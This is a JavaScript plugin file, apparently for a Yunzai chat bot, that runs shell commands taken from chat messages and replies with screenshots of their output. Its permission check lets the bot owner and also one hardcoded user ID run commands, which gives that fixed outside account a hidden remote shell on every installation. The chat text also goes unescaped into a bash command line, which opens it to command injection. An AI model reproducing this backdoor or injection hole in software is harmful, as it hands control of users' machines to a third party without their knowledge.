let htmlDir = `${process.cwd()}/plugins/TRSS-Plugin/Resources/Code/`
let tplFile = `${htmlDir}Code.html`
let path = `${process.env.HOME}/../`
let cmdPath = `${path}Main.sh`
let errorTips = "请使用脚本安装，再使用此功能\nhttps://Yunzai.TRSS.me\nhttps://TRSS.me"

export class Script extends plugin {
  constructor() {
    super({
      name: "脚本执行",
      dsc: "脚本执行",
      event: "message",
      priority: 10,
      rule: [
        {
          reg: "^脚本执行.+",
          fnc: "Script"
        }
      ]
    })
  }

  async execSync(cmd) {
    return new Promise((resolve, reject) => {
      exec(cmd, (error, stdout, stderr) => {
        resolve({ error, stdout, stderr })
      })
    })
  }

  async execTask(e, cmd) {
    logger.mark(`[脚本执行] 执行：${logger.blue(cmd)}`)
    let ret = await this.execSync(cmd)
    logger.mark(`[脚本执行]\n${ret.stdout.trim()}\n${logger.red(ret.stderr.trim())}`)

    if (ret.stdout) {
      let Code = await ansi_up.ansi_to_html(ret.stdout.trim())
      let img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
      await this.reply(img, true)
    }

    if (ret.stderr) {
      let Code = await ansi_up.ansi_to_html(ret.stderr.trim())
      let img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
      await this.reply(["标准错误输出：", img], true)
    }

    if (ret.error) {
      logger.error(`脚本执行错误：${logger.red(ret.error)}`)
      await this.reply(`脚本执行错误：${ret.error}`, true)
      await this.reply(errorTips)
    }
  }

  async Script(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    let msg = this.e.msg.replace("脚本执行", "").trim()
    let cmd = `bash "${cmdPath}" cmd "${msg}"`
    await this.execTask(e, cmd)
  }
}